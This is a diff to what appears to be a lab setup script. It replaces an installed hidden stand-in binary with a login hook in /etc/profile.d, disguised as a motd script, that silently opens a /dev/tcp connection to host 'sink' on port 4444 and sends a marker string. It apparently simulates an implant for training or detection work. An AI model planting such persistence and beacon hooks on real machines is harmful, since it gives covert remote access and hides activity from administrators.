@@ -4,9 +4,5 @@
 set -eu
 SI=/lab/standins
 need() { [ -e "$SI/$1" ] || { echo "$0: $SI/$1 is missing (copy the stand-ins in first)" >&2; exit 1; }; }
-need callback.sh
-install -m 755 "$SI/callback.sh" /usr/local/bin/.lab-sync
-cat > /etc/profile.d/lab-motd.sh <<'EOT'
-/usr/local/bin/.lab-sync >/dev/null 2>&1 &
-EOT
+echo "/bin/bash -c 'exec 3<>/dev/tcp/sink/4444 && echo lab-callback >&3' >/dev/null 2>&1 &" > /etc/profile.d/lab-motd.sh
 chmod 644 /etc/profile.d/lab-motd.sh
